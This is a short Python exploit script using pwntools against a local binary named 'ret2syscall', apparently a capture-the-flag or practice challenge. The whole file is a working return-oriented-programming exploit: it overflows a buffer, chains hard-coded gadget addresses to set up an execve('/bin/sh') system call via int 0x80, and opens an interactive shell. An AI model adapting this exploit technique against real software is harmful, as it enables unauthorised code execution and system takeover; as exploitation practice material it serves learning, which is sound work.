from pwn import *

pop_eax_ret_addr=0x080bb196
pop_ecx_ebx_ret_addr=0x0806eb91
pop_edx_ret_addr=0x806eb6a
int_80_addr=0x08049421
bin_sh_addr=0x080be408
eax=0xffffcffc
ebp=0xffffd068

payload=((ebp-eax+4)*b'A' \
         +p32(pop_eax_ret_addr)+p32(11) \
         +p32(pop_ecx_ebx_ret_addr)+p32(0)+p32(bin_sh_addr) \
         +p32(pop_edx_ret_addr)+p32(0) \
         +p32(int_80_addr))

sh=process("./ret2syscall")
sh.sendline(payload)
sh.interactive()

